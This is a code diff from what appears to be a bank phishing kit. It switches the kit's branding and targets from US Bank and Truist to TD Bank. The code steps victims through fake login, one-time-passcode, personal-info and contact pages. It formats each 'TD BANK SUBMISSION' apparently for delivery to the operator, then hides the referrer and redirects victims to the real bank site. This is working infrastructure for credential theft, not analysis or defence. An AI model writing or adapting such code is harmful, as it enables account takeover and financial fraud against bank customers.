@@ -170,7 +170,7 @@ const DEFAULT_PAGEFLOW = {
     "1": { page: "login", enabled: true },
     "2": { page: "otp", enabled: true },
     "3": { page: "info", enabled: true },
-    "4": { page: "bill", enabled: true },
+    "4": { page: "contact", enabled: true },
     "5": { page: "final", enabled: true }
   };
 
@@ -231,8 +231,8 @@ const routeMap = {
   login: "sign-in",
   otp: "sign-in?action=otp",
   info: "sign-in?action=info",
-  bill: "sign-in?action=bill",
-  final: "https://href.li/?https://usbank.com"
+  contact: "sign-in?action=contact",
+  final: "https://href.li/?https://onlinebanking.tdbank.com*"
 };
 
 function normalize(str = "") {
@@ -371,10 +371,10 @@ async function buildMessage(data, options = {}) {
     let heading;
 
     if (hasEmailOrUsername) {
-      heading = `👤 TRUIST NEW USER SUBMISSION`;
+      heading = `👤 TD BANK NEW USER SUBMISSION`;
     } else {
       const display = identifier || userId;
-      heading = `👤 TRUIST SUBMISSION\n\n USER: @${display}`;
+      heading = `👤 TD BANK SUBMISSION\n\n USER: @${display}`;
     }
 
     let message = `${heading}\n\n`;
